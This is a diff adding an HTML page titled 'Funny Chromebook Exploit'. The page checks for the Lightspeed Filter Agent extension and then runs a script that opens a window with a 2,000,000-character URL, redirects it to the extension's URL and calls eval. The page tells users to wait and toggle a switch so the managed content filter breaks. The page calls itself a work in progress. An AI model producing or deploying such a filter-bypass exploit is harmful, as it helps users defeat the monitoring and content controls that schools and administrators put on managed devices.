@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Funny Chromebook Exploit</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+</head>
+<style>
+    body {
+    font-family: "Inter", sans-serif;
+    background: linear-gradient(135deg, #1c386d, #3062b8);
+    background-size: 200% 200%; 
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;    
+    align-items: center;
+    height: 100vh;
+}
+
+.container {
+    text-align: center;
+    background-color: rgba(255, 255, 255, 0.9);
+    border-radius: 10px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+    padding: 30px;
+    width: 80%;
+    max-width: 600px;
+    transition: transform 0.3s;
+}
+
+.container:hover {
+    transform: scale(1.1);
+}
+
+.title {
+    font-size: 28px;
+    line-height: 1.5;
+    margin-bottom: 20px;
+}
+
+.bold {
+    font-weight: bold;
+}
+
+.exploit-button {
+    background-color: #007BFF;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    padding: 12px 24px;
+    font-size: 18px;
+    cursor: pointer;
+    transition: background-color 0.3s, transform 0.3s;
+}
+
+.exploit-button.disabled {
+    background-color: #ccc;
+    cursor: not-allowed;
+}
+
+.exploit-button:hover:not(.disabled) {
+    background-color: #0056b3;
+    transform: scale(1.05);
+}
+
+.explanation {
+    margin-top: 20px;
+    font-size: 16px;
+    color: #555;
+}
+
+.details {
+    margin-top: 10px;
+    font-size: 14px;
+    color: #777;
+}
+</style>
+<body>
+    <div class="container">
+        <h1 class="title">
+            <span class="bold">F</span>unny 
+            <span class="bold">C</span>hromebook 
+            <span class="bold">E</span>xploit 
+            <span class="bold">U</span>sing 
+            <span class="bold">W</span>indow() 
+            <span class="bold">E</span>valuate
+        </h1>
+        <button id="exploitButton" class="exploit-button" onclick="run()">Run Exploit</button>
+        <p id="message" class="explanation"></p>
+        <p class="details">To perform this exploit, press on the button then wait for a few secconds **WITHOUT CLOSING THE HANGER** then flip the switch twice, then you can close the window!, P.S this is a still a WIP project, dont rely on this since there are better options for now.</p>
+    </div>
+
+    <script>
+        // oki functions to detect tha url yk what im sayin?
+        async function checkUrl() {
+            const url = 'chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png';
+            try {
+                const response = await fetch(url);
+                if (response.ok) {
+                    document.getElementById('message').textContent = '';
+                } else {
+                    disableButton();
+                }
+            } catch (error) {
+                disableButton();
+            }
+        }
+
+        function disableButton() {
+            const button = document.getElementById('exploitButton');
+            setTimeout(() => {
+                button.disabled = true;
+                button.classList.add('disabled');
+                document.getElementById('message').textContent = "You don't have Lightspeed Filter Agent installed.";
+            }, 500);
+        }
+        window.onload = checkUrl;
+        //okay this is the fun part >:)
+        function run() {
+            let url = 'chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png'
+            const yx = 'https://' +  "f".repeat(2000000)
+            const x = window.open(yx)
+            if(x) {
+                x.document.location.replace(`${url}`)
+                x.eval(`
+                alert('DO NOT CLOSE THIS ALERT AS IT BREAKS THE EXPLOIT IF U DO SO, pls and ty :3 <3')
+                `) 
+            }
+        }
+        
+    </script>
+</body>
+</html>
